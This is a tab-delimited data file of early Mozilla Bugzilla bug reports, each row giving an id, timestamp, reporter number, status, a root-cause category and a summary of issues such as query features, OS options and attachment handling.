Id%TAB%Opening%TAB%Reporter%TAB%VerificationStatus%TAB%ResolutionStatus%TAB%RootCauseCategory%TAB%Components%TAB%Description%TAB%FullDescription
538%TAB%904184243%TAB%3791%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%HTML Dialogs,UI,Bugzilla-General%TAB%Bugzilla can't search bug lists for a text match%TAB%Bugzilla can't search bug lists for a text match
539%TAB%904196016%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%MIMELib,UI,Bugzilla-General%TAB%enter_bug.cgi chokes if we have multiple products.%TAB%enter_bug.cgi chokes if we have multiple products.
1105%TAB%908456833%TAB%2791%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%new_comment.cgi allows blank lines and extraineous spaces%TAB%new_comment.cgi allows blank lines and extraineous spaces
1464%TAB%911568378%TAB%3847%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need OS option of Win 98 in Bugzilla ,Need OS option of Win 98 in Bugzilla%TAB%Need OS option of Win 98 in Bugzilla ,Need OS option of Win 98 in Bugzilla
1499%TAB%911737834%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Custom queries are not remembered.%TAB%Custom queries are not remembered.
1659%TAB%911996336%TAB%4037%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%buglist.cgi has mismatched case for server push break string%TAB%buglist.cgi has mismatched case for server push break string
1746%TAB%912669993%TAB%4030%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Change "Submit" button to "Query" on Query Page%TAB%Change "Submit" button to "Query" on Query Page
1749%TAB%912675796%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%searching all fields,Ability to search all fields%TAB%searching all fields,Ability to search all fields
1765%TAB%912761876%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Would like to query URL field.%TAB%Would like to query URL field.
1840%TAB%913213140%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need to add Mac OS 8.5 to the OS list%TAB%Need to add Mac OS 8.5 to the OS list
1907%TAB%913629053%TAB%4237%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%When sorting bug list by "Importance" sort by severity as well as priority%TAB%When sorting bug list by "Importance" sort by severity as well as priority
2134%TAB%915462710%TAB%2791%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%bugzilla products cannot have spaces in the name%TAB%bugzilla products cannot have spaces in the name
2178%TAB%915531636%TAB%2791%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%bugs count charts are not displayed for products with spaces in the name%TAB%bugs count charts are not displayed for products with spaces in the name
2298%TAB%916132031%TAB%388%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Form Submission,Bugzilla,Bugzilla-General%TAB%Can't change OS when modifying a bug report%TAB%Can't change OS when modifying a bug report
2307%TAB%916155189%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Add TFV Field to Bugzilla%TAB%Add TFV Field to Bugzilla
2308%TAB%916155340%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need a QA Assigned field in Bugzilla.%TAB%Need a QA Assigned field in Bugzilla.
2311%TAB%916155653%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need a Status Summary Field in Bugzilla%TAB%Need a Status Summary Field in Bugzilla
2373%TAB%916322327%TAB%4125%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%[PP] please at a platform field for FreeBSD in the mozilla bug system%TAB%[PP] please at a platform field for FreeBSD in the mozilla bug system
2453%TAB%916490195%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Queries: Setting a string to "" but requesting regexp causes error,Blank regexp expression not ignored%TAB%Queries: Setting a string to "" but requesting regexp causes error,Blank regexp expression not ignored
2497%TAB%916740172%TAB%4080%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need to set up bugzilla fields to include mail/news area%TAB%Need to set up bugzilla fields to include mail/news area
2640%TAB%917350877%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Moving bug from Bugsplat to Buzilla function does not work.%TAB%Moving bug from Bugsplat to Buzilla function does not work.
2656%TAB%917360587%TAB%4080%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Include an "enter new bug" link at http://bugzilla.mozilla.org/post_bug.cgi,Include an "enter new bug" link on post_bug.cgi%TAB%Include an "enter new bug" link at http://bugzilla.mozilla.org/post_bug.cgi,Include an "enter new bug" link on post_bug.cgi
2706%TAB%917434671%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Have MoveToBugzilla Button update bug to Closed/Won't Fix%TAB%Have MoveToBugzilla Button update bug to Closed/Won't Fix
2707%TAB%917435397%TAB%3849%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%should be able to enter several comma-seperated values ,should be able to enter several comma-seperated values%TAB%should be able to enter several comma-seperated values ,should be able to enter several comma-seperated values
2709%TAB%917436699%TAB%4080%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%URL field not preserved when moving from bugsplat to bugzilla%TAB%URL field not preserved when moving from bugsplat to bugzilla
2732%TAB%917458605%TAB%4080%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%RFE: can the placement of the cc: field and the QA contact: field's be switched%TAB%RFE: can the placement of the cc: field and the QA contact: field's be switched
2741%TAB%917506278%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%cc field not transferred in Move Bug to Buzilla ,cc field not transferred in Move Bug to Buzilla%TAB%cc field not transferred in Move Bug to Buzilla ,cc field not transferred in Move Bug to Buzilla
2827%TAB%917931099%TAB%2365%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Time axis labels jammed together%TAB%Time axis labels jammed together
3029%TAB%918475801%TAB%4080%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Pls reset the password for nbaca@netscape.com.,passwords broken for 1 out of 26 people%TAB%Pls reset the password for nbaca@netscape.com.,passwords broken for 1 out of 26 people
3167%TAB%919234593%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Better Embedding APIs definition to replace.%TAB%Better Embedding APIs definition to replace.
3186%TAB%919423301%TAB%3858%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%"Your browser sent a non-HTTP compliant message.",Bugzilla can use too much cookie space.%TAB%"Your browser sent a non-HTTP compliant message.",Bugzilla can use too much cookie space.
3223%TAB%919534701%TAB%4126%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Bad quip in bug list%TAB%Bad quip in bug list
3245%TAB%919765719%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%NG Layout QA Contact Additions...%TAB%NG Layout QA Contact Additions...
3271%TAB%919878999%TAB%1672%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla: Mozilla product needs revamping%TAB%Bugzilla: Mozilla product needs revamping
3307%TAB%919971556%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Default priority (P2) is too high and should be changed to P3%TAB%Default priority (P2) is too high and should be changed to P3
3362%TAB%920328001%TAB%4584%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%No support for Grendel in Bugzilla%TAB%No support for Grendel in Bugzilla
3364%TAB%920362561%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%QA contact name spelling correction%TAB%QA contact name spelling correction
3365%TAB%920362894%TAB%4237%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Incorrect collection of stats when zero NEW or ASSIGNED bugs%TAB%Incorrect collection of stats when zero NEW or ASSIGNED bugs
3583%TAB%921062969%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%URL Link problem in Bugzilla -TEST%TAB%URL Link problem in Bugzilla -TEST
3589%TAB%921075046%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Changing component does not reset default Assigned/QA%TAB%Changing component does not reset default Assigned/QA
4082%TAB%921861139%TAB%4150%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%XP Utilities,Bugzilla,Bugzilla-General%TAB%Need a way to track bug reports/resolution by date range%TAB%Need a way to track bug reports/resolution by date range
4106%TAB%921976840%TAB%4672%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%javascript mods to query.cgi do not work on MS IE%TAB%javascript mods to query.cgi do not work on MS IE
4133%TAB%922085710%TAB%4685%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%new query feature causes javascript error in IE4, hang in netscape%TAB%new query feature causes javascript error in IE4, hang in netscape
4243%TAB%922289686%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Reopening bug leaves resolution%TAB%Reopening bug leaves resolution
4272%TAB%922363636%TAB%2147%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla gets confused by news: URLs in Comment fields%TAB%Bugzilla gets confused by news: URLs in Comment fields
4337%TAB%922574603%TAB%4019%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%processmail regenerate broken.  Bugzilla 2.2%TAB%processmail regenerate broken.  Bugzilla 2.2
4402%TAB%922734808%TAB%4019%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Spaces cause major headaches in Product names%TAB%Spaces cause major headaches in Product names
4456%TAB%922875611%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Auto insert of general template into new bug%TAB%Auto insert of general template into new bug
4477%TAB%922943126%TAB%4681%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Change Columns Feature -- Adding Target Milestone not working.,bugzilla doesn't warn users they need cookies enabled%TAB%Change Columns Feature -- Adding Target Milestone not working.,bugzilla doesn't warn users they need cookies enabled
4566%TAB%923349585%TAB%4810%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Email password ... WHEN?%TAB%Email password ... WHEN?
4889%TAB%923666967%TAB%1698%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Request "Summary" be required field for new bugs%TAB%Request "Summary" be required field for new bugs
4928%TAB%923708163%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%value attribute of login form hidden fields contains line breaks,escaping causes blank lines%TAB%value attribute of login form hidden fields contains line breaks,escaping causes blank lines
4971%TAB%923912544%TAB%4019%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Patch: Added -All- report, and UI cleanups%TAB%Patch: Added -All- report, and UI cleanups
5151%TAB%924193353%TAB%4130%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Can we have a link that leads back to the query result?%TAB%Can we have a link that leads back to the query result?
5152%TAB%924193531%TAB%4130%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%create a list by bug number%TAB%create a list by bug number
5179%TAB%924245059%TAB%422%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%Need to be able to put attachment on new bug.%TAB%Need to be able to put attachment on new bug.
5227%TAB%924288474%TAB%589%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%Email not sent out for added attachments%TAB%Email not sent out for added attachments
5249%TAB%924433648%TAB%2791%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%query.cgi javascript does not work on netscape 4.04 and 4.05%TAB%query.cgi javascript does not work on netscape 4.04 and 4.05
5279%TAB%924524153%TAB%4943%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%undefined variable in query.cgi%TAB%undefined variable in query.cgi
5299%TAB%924537823%TAB%4090%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%too easy to lose stored queries%TAB%too easy to lose stored queries
5345%TAB%924641764%TAB%4019%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Show login name at bug entry time / enter_bug.cgi uses invalid html%TAB%Show login name at bug entry time / enter_bug.cgi uses invalid html
5424%TAB%924853512%TAB%4130%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%duplicates should take advantage of 'bug XXXX' hyperlinking%TAB%duplicates should take advantage of 'bug XXXX' hyperlinking
5480%TAB%925082840%TAB%4644%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%Bugzilla refuses to accept attachment except as type "text/html",Bugzilla refuses to accept attachment if it is very very big.%TAB%Bugzilla refuses to accept attachment except as type "text/html",Bugzilla refuses to accept attachment if it is very very big.
5592%TAB%925227652%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need a Blocker severity...%TAB%Need a Blocker severity...
5604%TAB%925236404%TAB%5051%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Add bug-writing-guidelines.html to Bugzilla%TAB%Add bug-writing-guidelines.html to Bugzilla
5605%TAB%925238144%TAB%5051%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Patch to add 'Add New Component'%TAB%Patch to add 'Add New Component'
5672%TAB%925315981%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Add "My Open Bugs" Canned Report on Bugzilla Main Page%TAB%Add "My Open Bugs" Canned Report on Bugzilla Main Page
5687%TAB%925368747%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need more "M"'s for Target Milestone%TAB%Need more "M"'s for Target Milestone
5816%TAB%925488434%TAB%4250%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla does not remember the sorted column%TAB%Bugzilla does not remember the sorted column
5868%TAB%925724634%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Target Milestone link for CCK and MailNews not implemented.%TAB%Target Milestone link for CCK and MailNews not implemented.
5955%TAB%925896250%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need to be able to query by creation date.%TAB%Need to be able to query by creation date.
6198%TAB%926340657%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Bug 5764 is invisible%TAB%Bug 5764 is invisible
6308%TAB%926487128%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%I no longer get mailed when I change a bug!!!%TAB%I no longer get mailed when I change a bug!!!
6309%TAB%926494130%TAB%4019%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%"nospam" feature not case-insensitive%TAB%"nospam" feature not case-insensitive
6519%TAB%926768425%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%problem with attachment MIME types%TAB%problem with attachment MIME types
6576%TAB%926940488%TAB%4426%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Add Mac OS 8.6%TAB%Add Mac OS 8.6
6623%TAB%926956865%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%no comma between cclist and tolist in processmail "email sent to" output%TAB%no comma between cclist and tolist in processmail "email sent to" output
6649%TAB%927008790%TAB%5254%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Please add NTO Platform and OS and possible Photon GUI if such a place exists%TAB%Please add NTO Platform and OS and possible Photon GUI if such a place exists
6677%TAB%927026699%TAB%5051%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Ignore case on bug searches%TAB%Ignore case on bug searches
6682%TAB%927028097%TAB%5051%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Chart all bug states%TAB%Chart all bug states
6801%TAB%927186050%TAB%5265%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%install: syntax error in SQL in makeprofilestable.sh%TAB%install: syntax error in SQL in makeprofilestable.sh
6855%TAB%927207252%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Some new Bugzilla account requests not going through%TAB%Some new Bugzilla account requests not going through
6879%TAB%927215558%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Can new components auto alphabatize into component list?%TAB%Can new components auto alphabatize into component list?
6939%TAB%927408520%TAB%979%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Website,Bugzilla,Bugzilla-General%TAB%component needs adding for slamm's unix build configuration tool%TAB%component needs adding for slamm's unix build configuration tool
6944%TAB%927454707%TAB%4054%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%buglist: summary and whiteboard fight for space%TAB%buglist: summary and whiteboard fight for space
6945%TAB%927455209%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Potential clashes when submitting bug updates%TAB%Potential clashes when submitting bug updates
6987%TAB%927540155%TAB%3822%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Allow specification of "dependent" bugs within a bug%TAB%Allow specification of "dependent" bugs within a bug
7000%TAB%927549168%TAB%4432%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla sometimes does not set mailto:-Links properly%TAB%Bugzilla sometimes does not set mailto:-Links properly
7088%TAB%927648900%TAB%5309%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Request a preference to disable email name validation%TAB%Request a preference to disable email name validation
7233%TAB%927802228%TAB%5309%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Administration%TAB%versions rows should be forced to be unique,Editversions.cgi has a potential race resulting in duplicate versions%TAB%versions rows should be forced to be unique,Editversions.cgi has a potential race resulting in duplicate versions
7337%TAB%927925934%TAB%5300%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%running makeattachmenttable.sh not included in instructions%TAB%running makeattachmenttable.sh not included in instructions
7338%TAB%927926107%TAB%5300%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%process_bug.cgi omits PutHeader call%TAB%process_bug.cgi omits PutHeader call
7710%TAB%928703320%TAB%4956%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,User Accounts%TAB%Option to automatically put me on the CC: list of bugs I change,Pref to automatically put me on the CC: list of bugs I change%TAB%Option to automatically put me on the CC: list of bugs I change,Pref to automatically put me on the CC: list of bugs I change
7716%TAB%928743433%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Add link to Bug Writing Guideline off Bugzilla main page%TAB%Add link to Bug Writing Guideline off Bugzilla main page
7782%TAB%928841553%TAB%4125%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla doesn't sort milestones correctly%TAB%Bugzilla doesn't sort milestones correctly
7838%TAB%928910053%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need most-frequent-bugs page link put on Bugzilla pages%TAB%Need most-frequent-bugs page link put on Bugzilla pages
7873%TAB%928937086%TAB%4054%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%mid air collision and duplicates,duplicate isn't always resolved duplicate when marking as such,duplicate isn't always resolved DUP when marking as such%TAB%mid air collision and duplicates,duplicate isn't always resolved duplicate when marking as such,duplicate isn't always resolved DUP when marking as such
7953%TAB%929030014%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Popup Window when new Bugzilla Account files a first bug,Message pointing to bug writing resources with passwd mailout%TAB%Popup Window when new Bugzilla Account files a first bug,Message pointing to bug writing resources with passwd mailout
7983%TAB%929078612%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need a "Depends" Target Milestone%TAB%Need a "Depends" Target Milestone
8069%TAB%929242095%TAB%4644%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Cookie text appearing above banners of bug lists in MSIE 5.0 ,Cookie text appearing above banners of bug lists in MSIE 5.0,Cookie text appearing above banners of bug lists in all non Mozilla browsers%TAB%Cookie text appearing above banners of bug lists in MSIE 5.0 ,Cookie text appearing above banners of bug lists in MSIE 5.0,Cookie text appearing above banners of bug lists in all non Mozilla browsers
